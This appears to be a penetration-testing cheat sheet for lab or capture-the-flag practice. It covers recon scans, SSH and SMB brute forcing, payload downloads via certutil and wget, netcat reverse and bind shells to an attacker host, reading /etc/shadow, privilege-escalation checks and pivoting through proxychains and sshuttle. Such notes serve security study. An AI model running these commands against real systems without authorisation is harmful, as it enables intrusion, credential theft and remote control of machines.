Simple Commands
_______________

ifconfig
— show your Kali VM IP (e.g., 10.0.2.15).

sudo nano /etc/hosts 
— add or change local hostname-to-IP mappings that override DNS.

netdiscover -r 10.0.2.0/24
— sweep the subnet to discover live hosts (ARP scan for local networks).

nmap -T4 -p- -A 10.0.2.4
— aggressive full-TCP-port scan (1–65535) with OS/version/script detection and traceroute.

nmap -sV --script=vuln 10.0.2.4
— service version + vulnerability script scan (targeted follow-up).

*Always use the -oN paramter to save nmap output to text file ('nmap -T4 -p- -A 10.0.2.4 -oN test.txt')*

nikto -h http://10.0.2.4
— quick webserver/vuln & misconfiguration check (HTTP/HTTPS).

smbclient -L //10.0.2.4
— list SMB shares (anonymous if no -U user supplied).

smbclient //10.0.2.4/Share -U username
— connect interactively to an SMB share.

ssh username@10.0.2.4
— attempt SSH login

hydra -l root -P /usr/share/wordlists/metasploit/… ssh://*ip address* -t 4 -V
— Hydra is a bruteforce tool that is this case being utilized to brute-force the SSH password of a target system

gobuster dir -u http://10.0.2.4 -w /usr/share/wordlists/dirb/common.txt -x php,txt,zip
— brute-force directories/files on webserver (CLI alternative to DirBuster).
                   
crackmapexec smb 10.0.2.0/24 -u users.txt -p passwords.txt --shares
— SMB credential brute-forcing

dirb http://10.0.2.4 /usr/share/wordlists/dirb/common.txt -X .php,.txt
— another directory buster usage (find hidden files/dirs). 
                   
ffuf -u http://10.0.2.4/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt -t 40 -mc 200 -o ffuf_dirs.json -of json
— Finds directories/files under the web root.

wpscan --url http://target --enumerate
— Word Press Enumeration 
                   
File Transfers
_______________

HTTP (simple server) — python -m SimpleHTTPServer 80
Starts a quick HTTP server in the current directory (Python 2). (Python 3: python3 -m http.server 80.)

Browser — http://10.10.10.10/file.txt
Open the URL directly in a browser to download the file.

FTP (pyftpdlib) — python -m pyftpdlib 21 (attacker) → ftp 10.10.10.10 (client)
Run a lightweight FTP server on the host and connect via ftp from the target to transfer files.
                   
Certutil (Windows) — certutil.exe -urlcache -f http://10.10.10.10/file.txt file.txt
Uses the built-in Windows certutil to download a remote file and save it locally.
                   
Linux (wget) — wget http://10.10.10.10/file.txt
Command-line download of a file from an HTTP server.
                   
Addons
_______
  
- Download the foxyproxy extension then add a proxy specifically for burpsuite so you can use it very quickly and efficiently. 
- Download the Wappalyzer and or BuiltWith extension to identify the technologies running on a website. 
- Download the EditThisCookie extension to view, edit, export/import cookies
                   
Reverse/Bind Shells
___________________
# Attacker: listener
nc -lvp 4444
# Victim: reverse
nc <attacker_ip> 4444 -e /bin/sh

# Bind shell on victim
nc -nlvp 4444 -e /bin/sh
# Attacker connects
nc <victim_ip> 4444

Metasploit Workflow
___________________
msfconsole
search <service_or_cve>
use exploit/<module>
show options
set RHOSTS <target>
set PAYLOAD <payload>
set LHOST <attacker_ip>
exploit


Post-exploitation Enumeration
_____________________________
whoami; id
uname -a; cat /etc/os-release
ip a / ifconfig
netstat -tulpn / ss -tulpn
ps aux | less
ls -la /home
find / -type f -name "*pass*" 2>/dev/null
sudo -l
cat /etc/passwd; cat /etc/shadow   # shadow needs root

Privilege Escalation Auditing
_____________________________
                   
# Linux quick checks (use linpeas for automation)
sudo -l
ps aux | grep -i ssh
lsof -nP | grep LISTEN
cat /var/log/auth.log
find / -perm -u=s -type f 2 >dev/null                   
# Windows quick checks (use winPEAS)
whoami /priv
powershell Get-LocalGroupMember -Group Administrators


Pivoting
________
                   
Pivoting is the method of allowing ourselves to get access other networks from sitting on one network.

proxychains — forces a single command’s TCP traffic through one or more proxies (SOCKS4/5 or HTTP) defined in /etc/proxychains4.conf. 
Good for per-command proxying (e.g., proxychains nmap ...).

ssh -D (dynamic SOCKS proxy) — creates a local SOCKS listener that forwards traffic through the SSH tunnel (used as the proxy target for proxychains).

sshuttle — lightweight VPN-like tool that routes a whole subnet through an SSH host; after starting it, 
you don’t need to prefix every command — normal networking for that subnet is proxied.

Key files & bindings: 
- cat /etc/proxychains4.conf — view proxychains config.
'The last proxy line is typically the one you bind to (e.g. socks5 127.0.0.1 9050).'

Create an SSH dynamic forward (on attacker box):

- ssh -f -N -D 9050 -i pivot root@10.10.155.5

'This opens a local SOCKS proxy on localhost:9050 that tunnels via 10.10.155.5.'

Common proxychains usage (examples):

- Proxy a single command:

  . proxychains nmap -p 88 10.10.10.225

- If you need TCP connect mode for nmap (raw SYN scans often fail through proxies):

  . proxychains nmap 10.10.10.225 -sT


Run other tools via proxychains (example: Kerberos/SPN enumeration):

- proxychains GetUserSPNs.py MARVEL.local/fcastle:Password1 -dc-ip 10.10.10.255 -request

- RDP over proxychains (xfreerdp):

  . proxychains xfreerdp /u:administrator /p:'Hacker321!' /v:10.10.10.225

sshuttle usage (examples):

- Installation - sudo pip install sshuttle

- Route an entire subnet through pivot (using a private key):

  . sshuttle -r root@10.10.155.5 10.10.10.0/24 --ssh-cmd "ssh -i pivot"

  . Once running, any normal commands that target 10.10.10.* will route automatically through the pivot host.

When to use which tool:
- proxychains — when you want to proxy specific commands or tools and test many different proxies/configs. 
Good for quickly forcing one tool through SOCKS.

- sshuttle — when you want transparent access to a whole remote subnet (no need to prefix commands). 
Better for extended enumeration and tooling that expects direct network access.
  

                   






